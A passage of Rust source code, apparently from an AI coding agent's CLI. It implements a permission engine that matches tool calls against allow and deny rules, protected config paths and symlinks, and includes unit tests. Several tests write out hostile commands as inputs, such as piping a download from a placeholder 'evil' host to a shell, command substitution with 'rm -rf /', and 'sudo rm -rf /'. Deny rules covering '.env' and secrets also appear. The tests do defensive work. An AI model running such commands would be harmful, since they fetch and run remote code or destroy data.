            .or_else(|| relative_to(&place.lexical, &root.lexical))
            .filter(|r| !r.is_empty())
            .unwrap_or_else(|| place.lexical.display().to_string())
    }

    fn protected(&self, place: &Place) -> Option<&'static str> {
        let forms = place.forms();
        let hits = |targets: &[Place], cmp: fn(&Path, &Path) -> bool| {
            targets
                .iter()
                .any(|t| forms.iter().any(|p| t.forms().iter().any(|t| cmp(p, t))))
        };
        if hits(&self.inner.protected_files, same_path) {
            Some("distri.toml configures permissions and script-tool grants, so changing it always asks")
        } else if hits(&self.inner.protected_dirs, same_or_under) {
            Some(".distri/ holds script tools and their state, so changing it always asks")
        } else {
            None
        }
    }

    /// The first deny rule that matches: any form of the path, any part of the
    /// command (or the whole command).
    fn denied_by(&self, tool: &str, subject: &Subject) -> Option<String> {
        self.inner
            .deny
            .iter()
            .find(|entry| match (&entry.rule, subject) {
                (Rule::Tool(name), _) => name == tool,
                (
                    Rule::Command { tool: rt, matcher },
                    Subject::Command {
                        tool: st,
                        command,
                        parts,
                    },
                ) => {
                    rt == st
                        && (matcher.matches(&collapse_whitespace(command))
                            || parts.parts.iter().any(|p| matcher.matches(p)))
                }
                (
                    Rule::Path { tool: rt, pattern },
                    Subject::Path {
                        tool: st, place, ..
                    },
                ) => rt == st && place.forms().iter().any(|p| self.path_matches(pattern, p)),
                _ => false,
            })
            .map(|entry| entry.text.clone())
    }

    /// Whether allow rules cover the call: a bare name; for a command, every
    /// part (and nothing hidden); for a path, its resolved form.
    fn allowed(&self, tool: &str, subject: &Subject) -> bool {
        let allow = self.inner.allow.read().unwrap_or_else(|e| e.into_inner());
        if allow
            .iter()
            .any(|e| matches!(&e.rule, Rule::Tool(name) if name == tool))
        {
            return true;
        }
        match subject {
            Subject::Command {
                tool: st, parts, ..
            } => {
                !parts.hidden
                    && !parts.parts.is_empty()
                    && parts.parts.iter().all(|part| {
                        allow.iter().any(|e| {
                            matches!(&e.rule, Rule::Command { tool: rt, matcher } if rt == st && matcher.matches(part))
                        })
                    })
            }
            Subject::Path { tool: st, place, .. } => allow.iter().any(|e| {
                matches!(&e.rule, Rule::Path { tool: rt, pattern } if rt == st && self.path_matches(pattern, &place.resolved))
            }),
            Subject::Other => false,
        }
    }

    fn path_matches(&self, pattern: &PathPattern, path: &Path) -> bool {
        let glob_rel = |base: &Place| {
            base.forms().iter().any(|b| {
                relative_to(path, b)
                    .is_some_and(|rel| pattern.glob.matches_with(&rel, GLOB_OPTIONS))
            })
        };
        match pattern.anchor {
            PathAnchor::Project => glob_rel(&self.inner.root),
            PathAnchor::Home => self.inner.home.as_ref().is_some_and(glob_rel),
            PathAnchor::Absolute => {
                let candidate = path.to_string_lossy();
                if pattern.glob.matches_with(&candidate, GLOB_OPTIONS) {
                    return true;
                }
                // `/tmp/**` where /tmp is a symlink: match against the
                // pattern's literal directory, resolved.
                let (literal, rest) = split_literal_prefix(pattern.glob.as_str());
                let resolved = resolve_symlinks(Path::new(&literal));
                if resolved == Path::new(&literal) {
                    return false;
                }
                let rebuilt = format!(
                    "{}{}",
                    glob::Pattern::escape(&resolved.to_string_lossy()),
                    rest
                );
                glob::Pattern::new(&rebuilt).is_ok_and(|p| p.matches_with(&candidate, GLOB_OPTIONS))
            }
        }
    }
}

/// `/a/b/*.rs` → (`/a/b`, `/*.rs`): the directories before the first glob
/// character, and the rest.
fn split_literal_prefix(glob: &str) -> (String, String) {
    let first_meta = glob.find(['*', '?', '[']).unwrap_or(glob.len());
    let cut = glob[..first_meta].rfind('/').unwrap_or(0);
    let literal = if cut == 0 { "/" } else { &glob[..cut] };
    (literal.to_string(), glob[cut..].to_string())
}

fn project_key(root: &Place) -> String {
    root.resolved.to_string_lossy().into_owned()
}

fn user_denied(tool: &str, reason: Option<String>) -> Denied {
    let mut message = format!("The user denied this {tool} call.");
    if let Some(reason) = reason
        .map(|r| r.trim().to_string())
        .filter(|r| !r.is_empty())
    {
        message.push_str(" They said: ");
        message.push_str(&reason);
    }
    Denied { message }
}

fn unavailable_message(
    tool: &str,
    summary: &str,
    rule_hint: Option<&str>,
    kind: AskKind,
) -> String {
    let head = format!("{tool} needs permission and nobody could be asked (no terminal).");
    let example = |fallback: String| rule_hint.map(str::to_string).unwrap_or(fallback);
    match kind {
        AskKind::Command => format!(
            "{head} Allow it with --permission-mode bypass or an allow rule such as `{}` in distri.toml [permissions].",
            example(format!("{tool}(<command>:*)"))
        ),
        AskKind::Edit {
            inside_project: true,
        } => format!(
            "{head} Allow it with --permission-mode accept-edits|bypass or an allow rule such as `{}` in distri.toml [permissions].",
            example(format!("{tool}(src/**)"))
        ),
        AskKind::Edit {
            inside_project: false,
        } => format!(
            "{head} It is outside the project, so accept-edits does not cover it: allow it with --permission-mode bypass or an allow rule such as `{}` in distri.toml [permissions].",
            example(format!("{tool}(/absolute/path/**)"))
        ),
        AskKind::Protected => format!(
            "{head} {summary}; only --permission-mode bypass runs it without asking."
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use async_trait::async_trait;
    use serde_json::json;

    fn engine(
        mode: PermissionMode,
        allow: &[&str],
        deny: &[&str],
    ) -> (PermissionEngine, tempfile::TempDir) {
        let dir = tempfile::TempDir::new().unwrap();
        (
            PermissionEngine::new_for_test(dir.path(), mode, allow, deny),
            dir,
        )
    }

    fn bash(cmd: &str) -> serde_json::Value {
        json!({ "command": cmd })
    }

    fn file(path: &str) -> serde_json::Value {
        json!({ "file_path": path, "content": "a\nb\n" })
    }

    fn is_ask(c: &Check) -> bool {
        matches!(c, Check::Ask { .. })
    }

    fn is_deny(c: &Check) -> bool {
        matches!(c, Check::Deny { .. })
    }

    // -- modes ---------------------------------------------------------------

    #[test]
    fn mode_names_cycle_and_labels() {
        use PermissionMode::*;
        assert_eq!(Default.next(), AcceptEdits);
        assert_eq!(AcceptEdits.next(), Plan);
        assert_eq!(Plan.next(), Default);
        assert_eq!(Bypass.next(), Default);
        for m in [Default, AcceptEdits, Plan, Bypass] {
            assert_eq!(m.as_str().parse::<PermissionMode>().unwrap(), m);
            let json = serde_json::to_string(&m).unwrap();
            assert_eq!(json, format!("\"{}\"", m.as_str()));
            assert_eq!(serde_json::from_str::<PermissionMode>(&json).unwrap(), m);
        }
        assert_eq!(
            "accept_edits".parse::<PermissionMode>().unwrap(),
            AcceptEdits
        );
        assert_eq!(
            toml::from_str::<PermissionsConfig>("mode = \"accept_edits\"")
                .unwrap()
                .mode,
            Some(AcceptEdits)
        );
        assert!("yolo"
            .parse::<PermissionMode>()
            .unwrap_err()
            .contains("yolo"));
        assert_eq!(Plan.to_string(), "plan mode");
        assert_eq!(AcceptEdits.to_string(), "accept edits");
    }

    #[test]
    fn engine_cycles_and_sets_mode_across_clones() {
        let (e, _d) = engine(PermissionMode::Default, &[], &[]);
        let other = e.clone();
        assert_eq!(e.cycle_mode(), PermissionMode::AcceptEdits);
        assert_eq!(other.mode(), PermissionMode::AcceptEdits);
        other.set_mode(PermissionMode::Bypass);
        assert_eq!(e.mode(), PermissionMode::Bypass);
        assert_eq!(e.cycle_mode(), PermissionMode::Default);
    }

    // -- rule parsing ----------------------------------------------------------

    #[test]
    fn rules_parse_into_typed_forms() {
        assert_eq!(Rule::parse("Read").unwrap(), Rule::Tool("Read".into()));
        assert_eq!(
            Rule::parse("lookup_order").unwrap(),
            Rule::Tool("lookup_order".into())
        );
        assert_eq!(Rule::parse("Bash(*)").unwrap(), Rule::Tool("Bash".into()));
        assert_eq!(
            Rule::parse("Bash(cargo  test:*)").unwrap(),
            Rule::Command {
                tool: CommandTool::Bash,
                matcher: CommandMatch::Prefix("cargo test".into())
            }
        );
        assert_eq!(
            Rule::parse(" Bash(git status) ").unwrap(),
            Rule::Command {
                tool: CommandTool::Bash,
                matcher: CommandMatch::Exact("git status".into())
            }
        );
        assert_eq!(
            Rule::parse("execute_command(ls:*)").unwrap(),
            Rule::Command {
                tool: CommandTool::ExecuteCommand,
                matcher: CommandMatch::Prefix("ls".into())
            }
        );
        for (rule, tool, anchor) in [
            ("Write(src/**)", PathTool::Write, PathAnchor::Project),
            ("Edit(**/*.rs)", PathTool::Edit, PathAnchor::Project),
            ("Read(**)", PathTool::Read, PathAnchor::Project),
            ("Read(/etc/**)", PathTool::Read, PathAnchor::Absolute),
            ("Read(~/.ssh/**)", PathTool::Read, PathAnchor::Home),
        ] {
            match Rule::parse(rule).unwrap() {
                Rule::Path { tool: t, pattern } => {
                    assert_eq!(t, tool, "{rule}");
                    assert_eq!(pattern.anchor(), anchor, "{rule}");
                }
                other => panic!("{rule} parsed as {other:?}"),
            }
        }
    }

    #[test]
    fn malformed_rules_are_rejected_with_a_reason() {
        for (rule, needle) in [
            ("", "empty rule"),
            ("Bash(", "closing"),
            ("Bash()", "empty specifier"),
            ("Bash(:*)", "empty command prefix"),
            ("Bash(rm *)", "trailing `:*`"),
            ("Write(../x)", "`..`"),
            ("Write([)", "bad glob"),
            ("lookup_order(x)", "not supported"),
            ("my tool", "cannot appear"),
            ("(x)", "missing the tool name"),
        ] {
            let err = Rule::parse(rule).unwrap_err();
            assert!(
                err.to_string().contains(needle),
                "{rule:?}: {err} (wanted {needle:?})"
            );
            assert!(err.to_string().contains(&format!("`{rule}`")));
        }
    }

    // -- command splitting and matching ----------------------------------------

    #[test]
    fn commands_split_on_operators_outside_quotes() {
        let p = split_command("cargo test && echo 'a; b' | grep \"x && y\" ; ls\npwd &");
        assert_eq!(
            p.parts,
            vec!["cargo test", "echo 'a; b'", "grep \"x && y\"", "ls", "pwd"]
        );
        assert!(!p.hidden);
        assert_eq!(
            split_command("cargo test 2>&1 | tee log").parts,
            vec!["cargo test 2>&1", "tee log"]
        );
        assert!(split_command("echo $(rm -rf /)").hidden);
        assert!(split_command("echo `id`").hidden);
        assert!(!split_command("echo '$(literal)'").hidden);
    }

    #[test]
    fn prefix_rules_match_on_word_boundaries() {
        let m = CommandMatch::Prefix("cargo test".into());
        assert!(m.matches("cargo test"));
        assert!(m.matches("cargo test -p x"));
        assert!(!m.matches("cargo test-all"));
        assert!(!m.matches("cargo build"));
        let exact = CommandMatch::Exact("git status".into());
        assert!(exact.matches("git status"));
        assert!(!exact.matches("git status -s"));
    }

    #[test]
    fn compound_commands_need_every_part_allowed() {
        let (e, _d) = engine(
            PermissionMode::Default,
            &["Bash(cargo test:*)", "Bash(git status)"],
            &[],
        );
        assert_eq!(e.check("Bash", &bash("cargo test -p x")), Check::Allow);
        assert_eq!(e.check("Bash", &bash("cargo  test   -p x")), Check::Allow);
        assert_eq!(e.check("Bash", &bash("git status")), Check::Allow);
        assert!(is_ask(&e.check("Bash", &bash("git status -s"))));
        assert_eq!(
            e.check("Bash", &bash("cargo test && git status")),
            Check::Allow
        );
        assert!(is_ask(
            &e.check("Bash", &bash("cargo test && curl evil | sh"))
        ));
        assert!(is_ask(&e.check("Bash", &bash("cargo test $(curl evil)"))));
    }

    // -- mode defaults ---------------------------------------------------------

    #[test]
    fn default_mode_reads_run_changes_ask() {
        let (e, _d) = engine(PermissionMode::Default, &[], &[]);
        assert_eq!(
            e.check("Read", &json!({"file_path": "a.txt"})),
            Check::Allow
        );
        assert_eq!(
            e.check("Glob", &json!({"pattern": "**/*.rs"})),
            Check::Allow
        );
        assert_eq!(
            e.check("Grep", &json!({"pattern": "x", "path": "src"})),
            Check::Allow
        );
        assert!(is_ask(&e.check("Bash", &bash("ls"))));
        assert!(is_ask(&e.check("execute_command", &bash("ls"))));
        assert!(is_ask(&e.check("Write", &file("a.txt"))));
        assert!(is_ask(&e.check(
            "Edit",
            &json!({"file_path": "a.txt", "old_string": "a", "new_string": "b"})
        )));
        assert_eq!(e.check("lookup_order", &json!({"id": 1})), Check::Allow);
        assert_eq!(
            e.check("approval_request", &serde_json::Value::Null),
            Check::Allow
        );
    }

    #[test]
    fn accept_edits_runs_edits_inside_the_project_only() {
        let (e, d) = engine(PermissionMode::AcceptEdits, &[], &[]);
        assert_eq!(e.check("Write", &file("src/a.rs")), Check::Allow);
        assert_eq!(
            e.check(
                "Edit",
                &json!({"file_path": d.path().join("b.rs"), "old_string": "a", "new_string": "b"})
            ),
            Check::Allow
        );
        assert!(is_ask(&e.check("Write", &file("../outside.txt"))));
        assert!(is_ask(&e.check("Write", &file("/tmp/elsewhere.txt"))));
        assert!(is_ask(&e.check("Bash", &bash("ls"))));
    }

    #[test]
    fn plan_mode_refuses_changes_even_when_allowed() {
        let (e, _d) = engine(PermissionMode::Plan, &["Bash", "Write(**)"], &[]);
        for (tool, input) in [
            ("Bash", bash("ls")),
            ("execute_command", bash("ls")),
            ("Write", file("a.txt")),
            (
                "Edit",
                json!({"file_path": "a.txt", "old_string": "a", "new_string": "b"}),
            ),
        ] {
            assert_eq!(
                e.check(tool, &input),
                Check::Deny {
                    reason: PLAN_MODE_REASON.into()
                },
                "{tool}"
            );
        }
        assert_eq!(
            e.check("Read", &json!({"file_path": "a.txt"})),
            Check::Allow
        );
        assert_eq!(e.check("lookup_order", &json!({})), Check::Allow);
    }

    #[test]
    fn bypass_runs_everything_but_deny_rules() {
        let (e, _d) = engine(PermissionMode::Bypass, &[], &["Bash(rm:*)"]);
        assert_eq!(e.check("Bash", &bash("ls")), Check::Allow);
        assert_eq!(e.check("Write", &file("distri.toml")), Check::Allow);
        assert_eq!(e.check("Write", &file(".distri/tools/x.ts")), Check::Allow);
        assert!(is_deny(&e.check("Bash", &bash("rm -rf target"))));
    }

    // -- deny beats allow --------------------------------------------------------

    #[test]
    fn deny_beats_allow() {
        let (e, _d) = engine(
            PermissionMode::AcceptEdits,
            &["Bash", "Read", "Write(**)", "lookup_order"],
            &[
                "Bash(git push:*)",
                "Read(.env)",
                "Write(secrets/**)",
                "lookup_order",
            ],
        );
        assert_eq!(e.check("Bash", &bash("git status")), Check::Allow);
        match e.check("Bash", &bash("git status && git push origin main")) {
            Check::Deny { reason } => assert!(reason.contains("`Bash(git push:*)`"), "{reason}"),
            other => panic!("{other:?}"),
        }
        assert!(is_deny(&e.check("Read", &json!({"file_path": ".env"}))));
        assert!(is_deny(
            &e.check("Read", &json!({"file_path": "sub/../.env"}))
        ));
        assert!(is_deny(&e.check("Write", &file("secrets/k.pem"))));
        assert_eq!(e.check("Write", &file("src/k.rs")), Check::Allow);
        assert!(is_deny(&e.check("lookup_order", &json!({}))));
    }

    #[test]
    fn read_rules_cover_glob_and_grep_paths() {
        let (e, _d) = engine(PermissionMode::Default, &[], &["Read(vendor/**)"]);
        assert!(is_deny(
            &e.check("Grep", &json!({"pattern": "x", "path": "vendor/lib"}))
        ));
        assert!(is_deny(
            &e.check("Glob", &json!({"pattern": "*", "path": "vendor/a"}))
        ));
        assert_eq!(
            e.check("Grep", &json!({"pattern": "x", "path": "src"})),
            Check::Allow
        );
    }

    #[test]
    fn path_rules_glob_relative_absolute_and_home() {
        let (e, d) = engine(
            PermissionMode::Default,
            &["Write(src/**)", "Edit(**/*.rs)", "Write(/opt/out/*.txt)"],
            &[],
        );
        assert_eq!(e.check("Write", &file("src/a/b.ts")), Check::Allow);
        assert_eq!(
            e.check("Write", &file(&d.path().join("src/x").to_string_lossy())),
            Check::Allow
        );
        assert!(is_ask(&e.check("Write", &file("srcx/a.ts"))));
        let edit = |p: &str| json!({"file_path": p, "old_string": "a", "new_string": "b"});
        assert_eq!(e.check("Edit", &edit("main.rs")), Check::Allow);
        assert_eq!(e.check("Edit", &edit("a/b/c.rs")), Check::Allow);
        assert!(is_ask(&e.check("Edit", &edit("a/b/c.ts"))));
        // A relative rule never matches outside the project.
        assert!(is_ask(&e.check("Edit", &edit("/elsewhere/x.rs"))));
        assert_eq!(e.check("Write", &file("/opt/out/a.txt")), Check::Allow);
        assert!(is_ask(&e.check("Write", &file("/opt/out/sub/a.txt"))));
        // `..` that leaves `src` is not under `src/**`.
        assert!(is_ask(&e.check("Write", &file("src/../build.sh"))));
    }

    #[test]
    fn home_rules_match_under_home() {
        let project = tempfile::TempDir::new().unwrap();
        let home = tempfile::TempDir::new().unwrap();
        let e = PermissionEngine::load_with_home(project.path(), None, None, home.path()).unwrap();
        e.remember("Write(~/notes/**)").unwrap();
        assert_eq!(
            e.check(
                "Write",
                &file(&home.path().join("notes/a.md").to_string_lossy())
            ),
            Check::Allow
        );
        assert!(is_ask(&e.check(
            "Write",
            &file(&home.path().join("other/a.md").to_string_lossy())
        )));
    }

    #[cfg(unix)]
    #[test]
    fn symlinks_are_resolved_before_matching() {
        let (e, d) = engine(
            PermissionMode::AcceptEdits,
            &["Write(src/**)"],
            &["Write(secret/**)"],
        );
        let outside = tempfile::TempDir::new().unwrap();
        std::fs::create_dir_all(d.path().join("src")).unwrap();
        std::fs::create_dir_all(d.path().join("secret")).unwrap();
        // src/out -> a directory outside the project: not "inside", not src/**.
        std::os::unix::fs::symlink(outside.path(), d.path().join("src/out")).unwrap();
        assert!(is_ask(&e.check("Write", &file("src/out/x.txt"))));
        // link -> secret/: the deny rule sees through it.
        std::os::unix::fs::symlink(d.path().join("secret"), d.path().join("link")).unwrap();
        assert!(is_deny(&e.check("Write", &file("link/k.pem"))));
        // A dangling symlink is followed to where the write would land.
        std::os::unix::fs::symlink(d.path().join("secret/new.pem"), d.path().join("dangling"))
            .unwrap();
        assert!(is_deny(&e.check("Write", &file("dangling"))));
    }

    // -- protected paths --------------------------------------------------------

    #[test]
    fn protected_paths_ask_even_when_allowed() {
        let (e, d) = engine(
            PermissionMode::AcceptEdits,
            &["Write", "Edit", "Write(**)"],
            &[],
        );
        for path in [
            "distri.toml",
            "./distri.toml",
            "src/../distri.toml",
            "DISTRI.TOML",
            ".distri/tools/x.ts",
            ".distri",
            "src/../.distri/grants.json",
        ] {
            match e.check("Write", &file(path)) {
                Check::Ask { rule_hint, summary } => {
                    assert_eq!(rule_hint, None, "{path}");
                    assert!(summary.contains("always asks"), "{summary}");
                }
                other => panic!("{path}: {other:?}"),
            }
        }
        let abs = d.path().join("distri.toml");
        assert!(is_ask(&e.check(
            "Edit",
            &json!({"file_path": abs, "old_string": "a", "new_string": "b"})
        )));
        // A nested project's distri.toml is just a file.
        assert_eq!(e.check("Write", &file("sub/distri.toml")), Check::Allow);
        assert_eq!(e.check("Write", &file(".distrib/x")), Check::Allow);
    }

    #[test]
    fn home_distri_dir_and_configured_toml_are_protected() {
        let project = tempfile::TempDir::new().unwrap();
        let home = tempfile::TempDir::new().unwrap();
        let cfg_dir = tempfile::TempDir::new().unwrap();
        let toml_path = cfg_dir.path().join("custom.toml");
        std::fs::write(&toml_path, "[permissions]\nmode = \"bypass\"\n").unwrap();
        let e = PermissionEngine::load_with_home(
            project.path(),
            Some(&toml_path),
            Some(PermissionMode::AcceptEdits),
            home.path(),
        )
        .unwrap();
        // The override wins over the file's mode.
        assert_eq!(e.mode(), PermissionMode::AcceptEdits);
        e.remember("Write(/**)").unwrap();
        let in_home = home.path().join(".distri/tools/evil.ts");
        assert!(is_ask(&e.check("Write", &file(&in_home.to_string_lossy()))));
        // `~/.distri` reached through `..` from the project (both temp dirs
        // are siblings).
        assert_eq!(project.path().parent(), home.path().parent());
        let escape = format!(
            "../{}/.distri/permissions.json",
            home.path().file_name().unwrap().to_string_lossy()
        );
        assert!(is_ask(&e.check("Write", &file(&escape))));
        assert!(is_ask(
            &e.check("Write", &file(&toml_path.to_string_lossy()))
        ));
        assert_eq!(
            e.check(
                "Write",
                &file(&home.path().join("notes.md").to_string_lossy())
            ),
            Check::Allow
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_symlink_into_dot_distri_is_protected() {
        let (e, d) = engine(PermissionMode::AcceptEdits, &["Write(**)"], &[]);
        std::fs::create_dir_all(d.path().join(".distri/tools")).unwrap();
        std::os::unix::fs::symlink(d.path().join(".distri/tools"), d.path().join("tools")).unwrap();
        assert!(is_ask(&e.check("Write", &file("tools/x.ts"))));
    }

    // -- rule hints and summaries ------------------------------------------------

    #[test]
    fn rule_hints_name_the_command_or_path() {
        let b = |c: &str| command_rule_hint(CommandTool::Bash, c);
        assert_eq!(
            b("cargo test -p distri-cli").as_deref(),
            Some("Bash(cargo test:*)")
        );
        assert_eq!(b("git status").as_deref(), Some("Bash(git status:*)"));
        assert_eq!(b("git").as_deref(), Some("Bash(git)"));
        assert_eq!(b("git -C x push"), None);
        assert_eq!(b("ls -la src").as_deref(), Some("Bash(ls:*)"));
        assert_eq!(
            b("./scripts/check.sh --fast").as_deref(),
            Some("Bash(./scripts/check.sh:*)")
        );
        assert_eq!(b("cargo test && rm -rf /"), None);
        assert_eq!(b("echo $(id)"), None);
        assert_eq!(b("sudo rm -rf /"), None);
        assert_eq!(b("FOO=1 make"), None);
        assert_eq!(
            command_rule_hint(CommandTool::ExecuteCommand, "npm run build").as_deref(),
            Some("execute_command(npm run:*)")
        );
        // Every hint parses back into a rule that allows the command it came from.
        for cmd in ["cargo test -p x", "git", "ls -la", "pnpm install"] {
            let hint = b(cmd).unwrap();
            let (e, _d) = engine(PermissionMode::Default, &[&hint], &[]);
            assert_eq!(e.check("Bash", &bash(cmd)), Check::Allow, "{hint}");
        }
    }

    #[test]
    fn ask_summaries_and_hints_for_files() {
        let (e, d) = engine(PermissionMode::Default, &[], &[]);
        assert_eq!(
            e.check("Bash", &bash("cargo test")),
            Check::Ask {
                summary: "cargo test".into(),
                rule_hint: Some("Bash(cargo test:*)".into())
            }
        );
        assert_eq!(
            e.check("Write", &file("src/new.rs")),
            Check::Ask {
                summary: "src/new.rs (new file, 2 lines)".into(),
                rule_hint: Some("Write(src/new.rs)".into())
            }
        );
        std::fs::write(d.path().join("a[1].txt"), "x").unwrap();
        assert_eq!(
            e.check("Write", &file("a[1].txt")),
            Check::Ask {
                summary: "a[1].txt (overwrite, 2 lines)".into(),
                rule_hint: Some("Write(a[[]1[]].txt)".into())
            }
        );
        assert_eq!(
            e.check(
                "Edit",
                &json!({"file_path": "lib.rs", "old_string": "a", "new_string": "b\nc"})
            ),
            Check::Ask {
                summary: "lib.rs (-1 +2 lines)".into(),
                rule_hint: Some("Edit(lib.rs)".into())
            }
        );
        // The escaped hint allows exactly that file.
        let (e2, d2) = engine(PermissionMode::Default, &["Write(a[[]1[]].txt)"], &[]);
        std::fs::write(d2.path().join("a[1].txt"), "x").unwrap();
        assert_eq!(e2.check("Write", &file("a[1].txt")), Check::Allow);
        assert!(is_ask(&e2.check("Write", &file("a1.txt"))));
    }

    #[test]
    fn invalid_input_is_refused_with_the_parse_error() {
        let (e, _d) = engine(PermissionMode::Bypass, &[], &[]);
        match e.check("Bash", &json!({"cmd": "ls"})) {
            Check::Deny { reason } => {
                assert!(reason.starts_with("invalid Bash parameters"), "{reason}")
            }
            other => panic!("{other:?}"),
        }
    }

    // -- authorize ---------------------------------------------------------------

    struct Scripted(Mutex<Vec<Reply>>, Mutex<Vec<Interaction>>);

    impl Scripted {
        fn new(replies: Vec<Reply>) -> Self {
            Self(Mutex::new(replies), Mutex::new(Vec::new()))
        }
        fn asked(&self) -> Vec<Interaction> {
            self.1.lock().unwrap().clone()
        }
    }

    #[async_trait]
    impl Broker for Scripted {
        async fn ask(&self, interaction: Interaction) -> Reply {
            self.1.lock().unwrap().push(interaction);
            self.0.lock().unwrap().remove(0)
        }
    }

    #[tokio::test]
    async fn authorize_maps_replies_to_results() {
        let (e, _d) = engine(PermissionMode::Default, &[], &["Bash(rm:*)"]);
        let broker = Scripted::new(vec![
            Reply::Allow { remember: false },
            Reply::Deny {
                reason: Some("use cargo nextest".into()),
            },
            Reply::Deny { reason: None },
            Reply::Unavailable,
        ]);
        assert_eq!(
            e.authorize(&broker, "Bash", &bash("cargo test")).await,
            Ok(())
        );
        assert_eq!(
            e.authorize(&broker, "Bash", &bash("cargo test"))
                .await
                .unwrap_err()
                .message,
            "The user denied this Bash call. They said: use cargo nextest"
        );
        assert_eq!(
            e.authorize(&broker, "Bash", &bash("cargo test"))
                .await
                .unwrap_err()
                .message,
            "The user denied this Bash call."
        );
        let msg = e
            .authorize(&broker, "Bash", &bash("cargo test"))
            .await
            .unwrap_err()
            .message;
        assert!(
            msg.starts_with("Bash needs permission and nobody could be asked (no terminal)."),
            "{msg}"
        );
        assert!(msg.contains("`Bash(cargo test:*)`"), "{msg}");
        // Allowed and denied calls never ask.
        assert!(e
            .authorize(&broker, "Read", &json!({"file_path": "x"}))
            .await
            .is_ok());
        assert!(e
            .authorize(&broker, "Bash", &bash("rm -rf x"))
            .await
            .unwrap_err()
            .message
            .contains("`Bash(rm:*)`"));
        assert_eq!(
            broker.asked()[0],
            Interaction::Permit {
                tool: "Bash".into(),
                summary: "cargo test".into(),
                rule_hint: Some("Bash(cargo test:*)".into())
            }
        );
        assert_eq!(broker.asked().len(), 4);
    }

    #[tokio::test]
    async fn unavailable_messages_fit_the_tool() {
        let (e, _d) = engine(PermissionMode::Default, &[], &[]);
        let msg = e
            .authorize(&crate::interact::NoBroker, "Write", &file("src/a.rs"))
            .await
            .unwrap_err()
            .message;
        assert!(msg.contains("accept-edits|bypass"), "{msg}");
        let msg = e
            .authorize(&crate::interact::NoBroker, "Write", &file("distri.toml"))
            .await
            .unwrap_err()
            .message;
        assert!(msg.contains("only --permission-mode bypass"), "{msg}");
        let msg = e
            .authorize(&crate::interact::NoBroker, "Write", &file("/tmp/x.txt"))
            .await
            .unwrap_err()
            .message;
        assert!(msg.contains("outside the project"), "{msg}");
    }

    #[tokio::test]
    async fn remembering_persists_per_project() {
        let project = tempfile::TempDir::new().unwrap();
        let other = tempfile::TempDir::new().unwrap();
        let home = tempfile::TempDir::new().unwrap();
        let e = PermissionEngine::load_with_home(project.path(), None, None, home.path()).unwrap();
        let broker = Scripted::new(vec![Reply::Allow { remember: true }]);
        e.authorize(&broker, "Bash", &bash("cargo test -p a"))
            .await
            .unwrap();
        // This engine stops asking at once…
        assert_eq!(e.check("Bash", &bash("cargo test -p b")), Check::Allow);
        // …the rule is on disk under the canonical project path…
        let stored: RememberedFile = serde_json::from_str(
            &std::fs::read_to_string(home.path().join(".distri/permissions.json")).unwrap(),
        )
        .unwrap();
        let key = project
            .path()
            .canonicalize()
            .unwrap()
            .to_string_lossy()
            .into_owned();
        assert_eq!(stored.projects[&key].allow, vec!["Bash(cargo test:*)"]);
        // …a fresh engine for the project loads it, another project doesn't.
        let again =
            PermissionEngine::load_with_home(project.path(), None, None, home.path()).unwrap();
        assert_eq!(again.check("Bash", &bash("cargo test")), Check::Allow);
        let elsewhere =
            PermissionEngine::load_with_home(other.path(), None, None, home.path()).unwrap();
        assert!(is_ask(&elsewhere.check("Bash", &bash("cargo test"))));
        // Remembering twice keeps one entry.
        again.remember("Bash(cargo test:*)").unwrap();
        let stored: RememberedFile = serde_json::from_str(
            &std::fs::read_to_string(home.path().join(".distri/permissions.json")).unwrap(),
        )
        .unwrap();
        assert_eq!(stored.projects[&key].allow.len(), 1);
    }

    #[tokio::test]
    async fn remember_without_a_hint_stores_nothing() {
        let (e, _d) = engine(PermissionMode::Default, &[], &[]);
        let broker = Scripted::new(vec![Reply::Allow { remember: true }, Reply::Unavailable]);
        e.authorize(&broker, "Bash", &bash("a && b")).await.unwrap();
        assert!(e.authorize(&broker, "Bash", &bash("a && b")).await.is_err());
    }

    // -- config ------------------------------------------------------------------

    #[test]
    fn distri_toml_permissions_load_and_errors_name_the_file() {
        let project = tempfile::TempDir::new().unwrap();
        let home = tempfile::TempDir::new().unwrap();
        std::fs::write(
            project.path().join("distri.toml"),
            "[tools.lookup]\nnet = [\"api.example.com\"]\n\n[permissions]\nmode = \"accept-edits\"\nallow = [\"Bash(cargo test:*)\"]\ndeny = [\"Read(.env)\"]\n",
        )
        .unwrap();
        let e = PermissionEngine::load_with_home(project.path(), None, None, home.path()).unwrap();
        assert_eq!(e.mode(), PermissionMode::AcceptEdits);
        assert_eq!(e.check("Bash", &bash("cargo test")), Check::Allow);
        assert!(is_deny(&e.check("Read", &json!({"file_path": ".env"}))));

        std::fs::write(
            project.path().join("distri.toml"),
            "[permissions]\nallow = [\"Bash(\"]\n",
        )
        .unwrap();
        let err =
            PermissionEngine::load_with_home(project.path(), None, None, home.path()).unwrap_err();
        let text = format!("{err:#}");
        assert!(text.contains("[permissions] allow"), "{text}");
        assert!(text.contains("invalid permission rule `Bash(`"), "{text}");

        std::fs::write(
            project.path().join("distri.toml"),
            "[permissions]\nalow = []\n",
        )
        .unwrap();
        assert!(PermissionEngine::load_with_home(project.path(), None, None, home.path()).is_err());

        // No distri.toml: defaults.
        std::fs::remove_file(project.path().join("distri.toml")).unwrap();
        let e = PermissionEngine::load_with_home(project.path(), None, None, home.path()).unwrap();
        assert_eq!(e.mode(), PermissionMode::Default);
    }
}
